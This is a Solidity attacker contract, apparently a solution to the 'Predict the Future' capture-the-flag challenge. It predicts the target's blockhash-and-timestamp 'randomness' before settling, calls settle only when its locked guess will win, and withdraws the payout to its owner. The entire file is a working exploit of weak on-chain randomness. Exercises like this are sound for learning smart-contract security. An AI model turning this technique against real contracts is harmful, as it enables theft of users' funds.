//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.4;
import "hardhat/console.sol";

interface IPredictTheFutureChallenge {
    function lockInGuess(uint8 n) external payable;

    function settle() external;
}

contract PredictTheFutureAttacker {
    address public immutable owner;
    address public immutable challenge;
    uint256 public settlementBlock;
    uint8 public constant n = 1;

    constructor(address _challenge) {
        owner = msg.sender;
        challenge = _challenge;
    }

    function guess() external payable {
        IPredictTheFutureChallenge(challenge).lockInGuess{value: msg.value}(n);
        settlementBlock = block.number + 1;
    }

    function settle() external {
        require(block.number > settlementBlock);
        require(answer() == n);
        IPredictTheFutureChallenge(challenge).settle();
    }

    receive() external payable {}

    function withdraw() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }

    function check() external view returns (bool) {
        return answer() == n;
    }

    function answer() internal view returns (uint8) {
        uint8 number = uint8(
            uint256(
                keccak256(
                    abi.encode(blockhash(block.number - 1), block.timestamp)
                )
            )
        );
        return number % 10;
    }
}
